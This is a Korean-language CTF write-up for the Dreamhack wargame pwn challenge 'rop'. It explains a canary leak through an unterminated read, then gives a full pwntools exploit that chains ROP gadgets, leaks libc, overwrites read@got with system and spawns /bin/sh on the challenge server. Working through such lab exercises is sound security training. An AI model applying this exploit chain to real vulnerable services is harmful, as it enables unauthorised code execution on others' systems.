---
ctf_name: "Dreamhack-Wargame"
challenge_name: "rop"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "medium"      # easy / medium / hard / insane
author: "khgkhg05"
date: "2026-07-21"
points:
tags: [ELF, x86-64, BOF, stack-canary, ROP, GOT-overwrite, ret2libc]
---

# 문제명

`rop`

## 문제 설명

> 주어진 `rop` 파일에서 stack canary를 우회하고 ROP로 셸을 획득한다.

- 문제 파일: `rop`, `rop.c`, `libc.so.6`, `Dockerfile`
- 보호 기법: Partial RELRO, Canary, NX

## 풀이

### 분석

```c
int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```

`buf`는 `0x30`바이트인데 두 번 모두 `read(0, buf, 0x100)`으로 최대 `0x100`바이트를 받는다. 분석 결과 스택 프레임은 다음처럼 잡힌다.

```text
buf        = rbp - 0x40
canary     = rbp - 0x08
saved rbp  = rbp
ret        = rbp + 0x08
```

따라서 `buf`에서 canary까지는 `0x38`바이트, return address까지는 canary와 saved RBP를 포함해 `0x48`바이트가 필요하다.

보호 기법은 다음과 같다.

```text
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

NX가 켜져 있으므로 shellcode 실행은 어렵고, PIE가 꺼져 있으므로 바이너리 내부 PLT/GOT와 gadget 주소는 고정이다. Partial RELRO라서 GOT overwrite도 가능하다.

### 취약점

첫 번째 입력은 canary leak에 사용된다.

```c
read(0, buf, 0x100);
printf("Buf: %s\n", buf);
```

`read()`는 문자열 끝에 NUL을 붙이지 않는다. 그래서 `buf`를 정확히 채우고 canary 직전의 saved 영역까지 non-null 바이트로 덮으면, 이어지는 `printf("%s")`가 canary 영역까지 출력한다.

스택 canary의 첫 바이트는 문자열 기반 overflow 방어를 위해 `0x00`이다. 이 첫 바이트 때문에 그냥 출력하면 canary 앞에서 끊긴다. 따라서 첫 번째 payload는 다음처럼 canary의 첫 바이트만 `C`로 덮는다.

```python
leak_payload = b"A" * 0x30 + b"B" * 0x08 + b"C"
```

출력에서 우리가 보낸 payload 뒤에 따라오는 7바이트를 읽고, 앞에 `\x00`을 붙이면 원래 canary를 복구할 수 있다.

```python
p.sendafter(b"Buf: ", leak_payload)
p.recvuntil(leak_payload)
canary = b"\x00" + p.recvn(7)
```

두 번째 입력은 canary를 보존하면서 ROP chain을 올리는 데 사용한다.

### 익스플로잇

사용한 주요 주소는 다음과 같다.

```text
read@plt              = 0x4005f0
write@plt             = 0x4005c0
read@got              = 0x601038
pop rdi; ret          = 0x400853
pop rsi; pop r15; ret = 0x400851
ret                   = 0x400854

libc read             = 0x114980
libc system           = 0x50d60
```

`write()`와 `read()` 모두 세 번째 인자인 `rdx`가 필요하지만, 바이너리 안에는 편한 `pop rdx; ret` gadget이 없다. 여기서는 두 번째 `read(0, buf, 0x100)` 호출 직후 ROP chain으로 넘어가므로 `rdx`가 `0x100`으로 남아 있는 점을 이용한다.

ROP chain의 흐름은 다음과 같다.

1. `write(1, read@got, 0x100)`으로 libc의 `read()` 실제 주소를 leak한다.
2. leak 값에서 제공된 `libc.so.6`의 `read` offset `0x114980`을 빼서 libc base를 계산한다.
3. `read(0, read@got, 0x100)`으로 `read@got`에 `system` 주소를 덮고, 바로 뒤에 `/bin/sh\x00`을 쓴다.
4. `read@plt("/bin/sh")`를 호출한다. 이 시점의 `read@got`는 `system`으로 바뀌었으므로 실제로는 `system("/bin/sh")`가 실행된다.

핵심 exploit 코드는 다음과 같다.

```python
from pwn import *

HOST = "host3.dreamhack.games"
PORT = 11506

p = remote(HOST, PORT)
e = ELF("./rop")
libc = ELF("./libc.so.6")

leak_payload = b"A" * 0x30 + b"B" * 0x08 + b"C"
p.sendafter(b"Buf: ", leak_payload)
p.recvuntil(leak_payload)
canary = b"\x00" + p.recvn(7)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]

pop_rdi = 0x400853
pop_rsi_r15 = 0x400851
ret = 0x400854

payload = b"A" * 0x38
payload += canary
payload += b"B" * 0x08

payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

payload += p64(pop_rdi) + p64(read_got + 0x08)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b"Buf: ", payload)

read_leak = u64(p.recvn(6) + b"\x00" * 2)
p.recvn(0x100 - 6, timeout=1)
libc_base = read_leak - libc.symbols["read"]
system = libc_base + libc.symbols["system"]

p.send(p64(system) + b"/bin/sh\x00")
p.interactive()
```

## 플래그

```text
DH{REDACTED}
```

## 추가 파일

| 파일 | 설명 |
|------|------|
| `Dockerfile` | 문제 서비스의 Ubuntu 22.04, `socat` 기반 실행 환경 |
| `rop` | 문제 원본 ELF 바이너리 |
| `rop.c` | 문제 원본 C 소스 |
| `libc.so.6` | 원격 환경 기준으로 제공된 libc |
| `solve.py` | canary leak 후 `read@got` leak/GOT overwrite로 `system("/bin/sh")`를 실행하는 exploit |

## 배운 점

canary가 있어도 문자열 출력 primitive가 있으면 첫 null byte만 덮어서 나머지 7바이트를 leak할 수 있다. 또한 `pop rdx` gadget이 없어도 직전 함수 호출에서 남은 register state를 이용하면 `write()`와 `read()` 호출에 필요한 길이 인자를 맞출 수 있다.

이 문제에서는 No PIE와 Partial RELRO가 함께 열려 있어 고정 PLT/GOT 주소를 ROP에 그대로 사용할 수 있고, `read@got`를 `system`으로 덮어 `read@plt` 호출을 `system("/bin/sh")` 호출로 바꾸는 전형적인 GOT overwrite가 가능하다.
